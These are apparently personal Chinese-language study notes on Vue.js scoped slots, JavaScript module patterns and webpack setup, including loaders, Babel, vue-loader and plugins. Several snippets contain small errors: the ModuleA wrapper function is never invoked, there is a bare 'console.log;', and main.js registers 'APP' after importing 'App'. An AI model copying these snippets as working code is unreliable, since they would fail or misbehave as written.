+ 父组件模板的所有东西都会在父级作用域内编译
+ 子组件模板的所有东西都会在子级作用域内编译
```vue
<div id='app'>
  <cpn v-show='isShow'></cpn> <!--Vue实例里的isShow-->
  <cpn v-for='item in names'></cpn>
</div>
```
```vue
<template id='cpn'>
  <div>
    <button v-show='isShow'></button> <!--components里cpn的isShow-->
  </div>
</template>
```
#### 4. 作用域插槽
+ 父组件替换插槽的标签，但是内容由子组件来提供
+ 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定
```html
<!--父组件-->
<div id='app'>
  <cpn></cpn>
  <cpn>
    <!--目的是获取子组件中的pLanguages-->
    <template slot-scope='slot'>
      <span v-for='item in slot.data'>{{ item }}-</span>
      <span>{{ slot.data.join('-') }}</span>
    </template>
  </cpn>
</div>

<!--子组件-->
<template id='cpn'>
  <div>
    <slot :data='pLanguages'>
      <ul>
        <li v-for='item in pLanguages'>{{ item }}</li>
      </ul>
     </slot>
  </div>
</template>

<script>
  const app = new Vue({
    el: '#app',
    data: {},
    components: {
      cpn: {
        template: '#cpn',
        data() {
          return {
            pLanguages: ['JavaScript','C++','Java','C#','Python']
          }
        }
      }
    }
  })
</script>
```
## 模块化开发

+ 模块
  + 理解：向外提供特定功能的js程序，一般就是一个js文件
  + 为什么：js文件很多很复杂
  + 作用：复用js，简化js的编写，提高js运行效率
+ 模块化
  - 当应用中的js都以模块来编写的，那这个应用就是一个模块化的应用
    - 简单写js代码带来的问题
    - 闭包引起代码不可复用
    - 模块最基础的封装
```js
//在匿名函数内部，定义一个对象
//给对象添加各种需要暴露到外面的属性和方法(不需要暴露的直接定义即可)
//最后将这个对象返回，并且在外面使用了一个MoudleA接受
var ModuleA = (function() {
  //1.定义一个对象
  var obj = {}
  //2.在对象内部添加变量和方法
  obj.flag = true
  obj.myFunc = function (info) {
    console.log(info);
  }
  //3.将对象返回
  return obj
})
```
```js
//在main.js中只需要使用属于自己模块的属性和方法即可
if(ModuleA.flag){
  console.log;
}
ModuleA.myFunc('')
console.log(ModuleA)
```
+ 模块化有两个核心：**导出**和**导入**
  - CommonJS的导出
  ```
  module.exports = {}
  ```
  - CommonJS的导入
  ```
  let {} = require('moduleA')
  ```
### 一、ES6的模块化实现
#### 1. ES6模块化的导入和导出
##### `export`用来**导出**变量
```
<script src='aaa.js' type='module'></script>
```
①导出方式一
```
export {
  flag, sum
}
```
②导出方式二
```
export var num = 1000;
export var height = 1.88
```
③导出函数/类
```
export function sum(num1, num2) {
  return num1 + num2
}

export class Person {
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  run() {
    console.log('在奔跑')
  }
}
```
④export default

+ 某些情况下，一个模块中包含某个功能，我们并不希望给这个功能命名，而是让导入者可以自己来命名
  - 这个时候就可以使用export default
```
const address = '北京市'
export default address
```
```
export default function (argument) {
	console.log(argument)
}
```
+ export default在同一个模块中，不允许同时存在多个

##### `import`用来**导入**模块
```
import {flag, sum, Person} from './aaa.js';

const p = new Person()
p.run()
```
+ 导入export default中的内容时不需要加`{}`
```
import addr from './aaa.js'
```
+ 统一全部导入
```
import * as info from './aaa.js'
console.log(info.flag)
```

## Webpack
+ 从本质上来讲，webpack是一个现代的JavaScript应用的静态**模块** **打包**工具
+ webpack其中一个核心就是让我们可能进行模块化开发，并且会帮助我们处理模块间的依赖关系
  - JavaScript、CSS、图片、json文件等等在webpack中都可以被当做模块来使用
+ webpack为了可以正常运行，必须依赖node环境
  - node环境为了可以正常执行很多代码，必须其中包含各种依赖的包 => npm工具(node packages manager)
### 一、webpack的使用
#### 1. 准备工作
+ **`dist`文件夹：用于存放之后打包的文件**
+ **`src`文件夹：用于存放我们写的源文件**
+ `main.js`：项目的入口文件
  - mathUtils.js：定义了一些数学工具函数，可以在其他地方引用，并且使用
+ `index.html`：浏览器打开展示的首页html

#### 2. js文件的打包
```
webpack ./src/main.js ./dist/bundle.js
```
+ 打包后会在dist文件夹下，生成一个bundle.js文件
  - bundle.js文件，是webpack处理了项目直接文件依赖后生成的一个js文件，我们只需要将这个js文件在index.html中引入即可
  ```
  <script src='./dist/bundle.js'></script>
  ```
#### 3. webpack的配置
+ `package.json`：通过`npm init`生成的，npm包管理的文件
```
npm install
```
+ 可以将webpack的入口和出口参数写到配置中，在运行时直接读取:
  - 创建一个`webpack.config.js`文件
  ```
  const path = require ('path')	//依赖node里的包
  
  module.exports = {
    //入口：可以是字符串/数组/对象
    entry: './src/main.js',
	
    //出口：通常是一个对象，里面至少包含两个重要属性，path和filename
    output: {
      path: path.resolve(__dirname,'dist'),	//绝对路径 => 动态地获取路径
      filename: 'bundle.js'
    }
  }
  ```
  - 以上使用的webpack是全局的webpack
  - 但是一个项目往往依赖特定的webpack版本，全局的版本可能和这个项目的webpack版本不一致，导致打包出现问题。所以通常一个项目，都有自己局部的webpack
+ plus
  - ①项目中需要安装自己局部的webpack
    ```
    npm install webpack@3.6.0 --save-dev
    ```
    * 在终端敲```webpack```命令，用的都是全局的
  - ②通过```node_modules/.bin/webpack```启动webpack打包
    * 我们可以在package.json的scripts中定义自己的执行脚本，让```webpack```命令和```npm run build```命令映射起来
    * 打开`package.json`文件：
    ```
    {
      'scripts': {
        'build': 'webpack'
      },
    }
    ```
    * 执行`npm run build`
    * package.json中的scripts的脚本在执行时，会按照一定的顺序寻找命令对应的位置:
      - 首先，会寻找本地的node_modules/.bin路径中对应的命令
      - 如果没有找到，会去全局的环境变量中寻找
### 二、loader
+ loader是webpack中一个非常核心的概念
+ 在我们之前的实例中，我们主要是用webpack来处理我们写的js代码，并且webpack会自动处理js之间相关的依赖
+ 但是，在开发中我们不仅仅有基本的js代码处理，我们也需要加载css、图片，也包括一些高级的将ES6转成ES5代码，将TypeScript转成ES5代码，将scss、less转成css，将.jsx、.vue文件转成js文件等等
+ 对于webpack本身的能力来说，对于这些转化是不支持的
+ 所以我们需要给webpack扩展对应的loader
+ 大部分loader我们都可以在[webpack](https://webpack.docschina.org/)的官网中找到，并且学习对应的用法
#### 1. loader使用过程
①通过npm安装需要使用的loader

②在webpack.config.js中的module关键字下进行配置

#### 2. css文件的配置
+ `css-loader`只负责加载css文件，但是并不负责将css具体样式嵌入到文档中
+ `style-loader`负责将样式添加到DOM中
  - style-loader需要放在css-loader的前面
  - 因为webpack在读取使用的loader的过程中，是按照**从右向左**的顺序读取的。
+ 在`main.js`（入口文件）中引用：
  ```
  require('./css/normal.css')
  ```
#### 3. less文件的处理
#### 4. 图片文件的处理
```css
body {
	background: url(../imgs/1.jpg)
}
```
+ 安装`url-loader`
  - 当加载的图片小于`limit`（默认8196 => 8kb）时，会将图片编译成`base64`字符串形式
  - 当加载的图片大于`limit`时，需要安装`file-loader`模块进行加载
+ 再次打包，就会发现`dist`文件夹下多了一个图片文件
  - webpack自动帮助我们生成一个非常长的名字，这是一个32位hash值，目的是防止名字重复
  - 但是，真实开发中，我们可能对打包的图片名字有一定的要求
    * 比如，将所有的图片放在一个文件夹中，跟上图片原来的名称，同时也要防止重复
  ```webpack.config.js
  options: {
    limit: 8192,
    name: 'img/[name].[hash:8].[ext]'
  }
  //img：文件要打包到的文件夹
  //name：获取图片原来的名字，放在该位置
  //hash:8：为了防止图片名称冲突，依然使用hash，但是我们只保留8位
  //ext：使用图片原来的扩展名
  ```
+ 图片没有显示 => 我们整个程序是打包在dist文件夹下的，所以我们需要在路径下再添加一个dist/：
  - 在`webpack.config.js`中的output下进行配置
  ```
  module.exports = {
    output: {
      ...
      publicPath: 'dist/'
    }
  }
  ```
#### 5. ES6转ES5的babel
+ 如果仔细阅读webpack打包的js文件，发现写的ES6语法并没有转成ES5，那么就意味着可能一些对ES6还不支持的浏览器没有办法很好的运行代码
+ 如果希望将ES6的语法转成ES5，那么就需要使用babel
+ 而在webpack中，直接使用babel对应的loader就可以了
+ 配置webpack.config.js文件
#### 6. 配置Vue
```
npm install vue --save
```
使用Vue进行开发
```
import Vue from 'vue'
```
有报错 =>

`runtime-only` -> 代码中不可以有任何的template

`runtime-compiler` -> 代码中可以有template，因为有compiler可以用于编译template

配置webpack.config.js文件

```
module.exports = {
	resolve: {
		alias: {
			'vue$': 'vue/dist/vue.esm.js'
		}
	}
}
```

#### 创建Vue时template和el关系
+ el用于指定Vue要管理的DOM，可以帮助解析其中的指令、事件监听等等；
+ 而如果Vue实例中同时指定了template，那么template模板的内容会替换掉挂载的对应el的模板
+ 这样做就不需要在以后的开发中再次操作index.html，只需要在template中写入对应的标签即可
```
new Vue({
	el: '#app',
	template: `
		<div>
			<h2>{{ message }}</h2>
		</div>
	`
})
```
#### 	Vue的使用
```app.vue
<template>
	<div>
		<h2 class='title'>{{ message }}</h2>
		<button @click='btnClick'>按钮</button>
	</div>
</template>

<script>
	export default {
		name: 'App',
		data() {
			return {
				message: 'Hello Webpack'
			}
		},
		methods: {
			btnClick() {
			}
		}			
	}
</script>

<style scoped>
	.title {
		color: yellow;
	}
</style>
```

```main.js
import App from './vue/App.vue'

new Vue({
	el: '#app',
	template: '<App/>',
	components: {
		APP
	}
})
```
+ 安装`vue-loader`和`vue-template-compiler`
+ 修改webpack.config.js的配置文件
```
{
	test: /\.vue$/,
	use: ['vue-loader']
}
```
+ 省略js、css、vue的后缀名
  - 修改webpack.config.js的配置文件

  ```
  module.exports = {
    resolve: {
      extensions: ['.js','.css','.vue']
    }
  }
  ```
### 三、plugin
#### plugin是什么？
+ plugin是插件的意思，通常是用于对某个现有的架构进行扩展
+ webpack中的插件，就是对webpack现有功能的各种扩展，比如打包优化，文件压缩等等
#### loader和plugin区别
+ loader主要用于转换某些类型的模块，它是一个转换器
+ plugin是插件，它是对webpack本身的扩展，是一个扩展器
#### plugin的使用过程
步骤一：通过npm安装需要使用的plugins(某些webpack已经内置的插件不需要安装)

步骤二：在webpack.config.js中的plugins中配置插件

+ `BannerPlugin`：为打包的文件添加版权声明，属于webpack自带的插件

```
const webpack = require('webpack')

module.exports = {
	...
	plugins: [
		new webpack.BannerPlugin('最终版权归...所有')
	]
}
```





# [VueCLI](VueCLI.md)
